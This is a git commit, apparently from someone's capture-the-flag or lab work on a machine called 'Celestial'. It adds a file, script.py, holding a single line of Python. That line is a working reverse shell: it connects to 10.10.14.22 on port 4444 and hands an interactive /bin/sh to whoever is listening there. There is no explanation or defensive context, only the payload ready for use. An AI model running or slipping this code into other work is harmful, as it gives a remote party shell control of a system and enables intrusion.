81a531c4c550567001eebdd067bb96398aa1364b
root <neal1991@sina.com>
2019-06-12 12:20:12 +0000

    finish Celestial

---
+++ Celestial/script.py
@@ -0,0 +1,1 @@
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.22",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
